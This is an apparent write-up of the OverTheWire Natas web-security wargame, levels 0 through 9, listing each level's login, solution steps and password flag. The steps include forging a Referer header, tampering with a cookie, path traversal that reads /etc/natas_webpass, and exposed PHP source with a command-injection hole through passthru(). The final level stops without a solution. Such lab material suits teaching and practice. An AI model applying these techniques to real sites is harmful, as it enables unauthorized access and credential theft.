# Level 0
http://overthewire.org/wargames/natas/natas0.html

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

1. View Page Source

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

**Flag** `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

# Level 1
http://overthewire.org/wargames/natas/natas1.html
```
Username: natas1
Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
URL:      http://natas1.natas.labs.overthewire.org
```

2. View Page Source
```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

**Flag**: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# Level 2

http://overthewire.org/wargames/natas/natas2.html
```
Username: natas2
Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
URL:      http://natas2.natas.labs.overthewire.org
```

```
http://natas2.natas.labs.overthewire.org/files/pixel.png
```
```
http://natas2.natas.labs.overthewire.org/files/
```
```
http://natas2.natas.labs.overthewire.org/files/users.txt
```

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

**Flag:** `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

# Level 3
http://overthewire.org/wargames/natas/natas3.html
```
Username: natas3
Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
URL:      http://natas3.natas.labs.overthewire.org
```

http://natas3.natas.labs.overthewire.org/robots.txt

```
User-agent: *
Disallow: /s3cr3t/
```

http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

**Flag:** `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

# Level 4
http://overthewire.org/wargames/natas/natas4.html

```
Username: natas4
Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
URL:      http://natas4.natas.labs.overthewire.org
```

[PHP - Detect the incoming url requesting php page from another source/url](https://stackoverflow.com/questions/9790771/php-detect-the-incoming-url-requesting-php-page-from-another-source-url)

Find query, edit `Referer` header and resend
```
GET http://natas4.natas.labs.overthewire.org/index.php
```
```
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas5.natas.labs.overthewire.org/
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: keep-alive
Cookie: __cfduid=d805f2e2655530eb5f74e8bf15df1da681565258153
```

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

**Flag:** `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

# Level 5
http://overthewire.org/wargames/natas/natas5.html

```
Username: natas5
Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
URL:      http://natas5.natas.labs.overthewire.org
```

Change `loggedin` cookie from `0` to `1`

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

**Flag:** `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

# Level 6
http://overthewire.org/wargames/natas/natas6.html

```
Username: natas6
Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
URL:      http://natas6.natas.labs.overthewire.org
```

http://natas6.natas.labs.overthewire.org/index-source.html

```

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```

Go to
http://natas6.natas.labs.overthewire.org/includes/secret.inc

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submit secret here http://natas6.natas.labs.overthewire.org/

```
 Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```

**Flag:** `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

# Level 7
http://overthewire.org/wargames/natas/natas7.html

```
Username: natas7
Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
URL:      http://natas7.natas.labs.overthewire.org
```

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

**Flag:** `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

# Level 8
http://overthewire.org/wargames/natas/natas8.html

```
Username: natas8
Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
URL:      http://natas8.natas.labs.overthewire.org
```

http://natas8.natas.labs.overthewire.org/index-source.html

```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

 * bin2hex - https://www.php.net/manual/en/function.bin2hex.php
 * strrev - https://www.php.net/manual/en/function.strrev.php
 * base64_encode - https://www.php.net/manual/en/function.base64-encode.php

Can be reversed by

 * hex2bin - https://www.php.net/manual/en/function.hex2bin.php
 * strrev - https://www.php.net/manual/en/function.strrev.php
 * base64_decode - https://www.php.net/manual/en/function.base64-decode.php

```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$decodedSecret = base64_decode(strrev(hex2bin($encodedSecret)));
echo $decodedSecret; // oubWYf2kBq
?>
```

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

**Flag:** `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

# Level 8
http://overthewire.org/wargames/natas/natas9.html

```
Username: natas9
Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
URL:      http://natas9.natas.labs.overthewire.org
```

http://natas9.natas.labs.overthewire.org/index-source.html

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

[passthru](https://www.php.net/manual/en/function.passthru.php) — Execute an external program and display raw output

**Flag:** ``